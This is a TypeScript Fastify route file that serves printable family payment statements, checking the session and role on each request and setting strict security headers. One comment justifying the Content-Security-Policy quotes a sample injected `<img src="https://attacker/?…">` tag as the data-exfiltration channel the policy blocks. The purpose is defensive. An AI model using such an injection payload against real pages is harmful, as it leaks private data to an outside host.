// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 OpenMasjid-Solutions
/**
 * Authed serving of printable family statements (CLAUDE.md §4, §5, §14). Registered before the
 * SPA fallback and excluded from the tRPC/session middleware — it gates itself: session from the
 * cookie, role must be admin (LAN only) or finance (LAN + tunnel), re-checked on every request.
 * The statement carries a family's balance, payment history and every child's Student ID, so it is
 * NEVER on a public static mount.
 */
import type { FastifyInstance, FastifyRequest, FastifyReply } from 'fastify';
import { getSession, COOKIE } from '../auth/sessions';
import { classifyOrigin } from '../security/origin';
import { config } from '../config';
import { buildFamilyStatementHtml, canServeStatement } from './statements';

/**
 * Defence in depth for a page assembled by string concatenation that carries a family's Student IDs
 * and payment history (§14). The values in it are all escaped, so this is a second line, not the first.
 *
 * `'unsafe-inline'` is a deliberate, bounded compromise. The sheet has one authored `<style>` block and
 * one `onclick="window.print()"`, both static and both ours; a nonce-based policy is stricter and is
 * the right follow-up, but it is not the part doing the work here. What this policy buys, even with
 * inline allowed, is that `default-src 'none'` blocks EVERY external load — so an injected
 * `<img src="https://attacker/?…">` never fires and there is no channel to exfiltrate the page down —
 * plus no framing, no form posts, and no `<base>` hijack. That is worth having, and it cannot regress
 * rendering: `img-src data:` covers both the inlined logo and the QR code, which are the only images.
 *
 * `/api/logo` sets a policy of the same shape (index.ts); this brings the statement route in line.
 */
const STATEMENT_CSP = [
  "default-src 'none'",
  "img-src data:", // the inlined logo + the generated QR — both data: URIs, nothing remote
  "style-src 'unsafe-inline'",
  "script-src 'unsafe-inline'", // the Print button's onclick
  "form-action 'none'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
].join('; ');

/** The origin the QR points at: the tunnel public URL when set, else the LAN host of this request. */
function baseUrlFor(req: FastifyRequest): string {
  if (config.omosPublicUrl) return config.omosPublicUrl;
  const xfp = req.headers['x-forwarded-proto'];
  const proto = (Array.isArray(xfp) ? xfp[0] : xfp)?.split(',')[0].trim() || req.protocol || 'http';
  const host = req.headers.host || `localhost:${config.port}`;
  return `${proto}://${host}`;
}

export function registerStatementRoutes(app: FastifyInstance): void {
  app.get('/statements/family/:id', async (req: FastifyRequest<{ Params: { id: string } }>, reply: FastifyReply) => {
    const token = (req as unknown as { cookies?: Record<string, string> }).cookies?.[COOKIE];
    const session = getSession(token);
    if (!session || !canServeStatement(session.role, classifyOrigin(req))) {
      return reply.code(403).type('text/plain').send('You don’t have access to that.');
    }
    const html = await buildFamilyStatementHtml(req.params.id, baseUrlFor(req));
    if (html == null) return reply.code(404).type('text/plain').send('Not found.');
    return reply
      .header('Content-Type', 'text/html; charset=utf-8')
      .header('Cache-Control', 'no-store')
      .header('Content-Security-Policy', STATEMENT_CSP)
      .header('X-Content-Type-Options', 'nosniff')
      .header('Referrer-Policy', 'no-referrer')
      .send(html);
  });
}
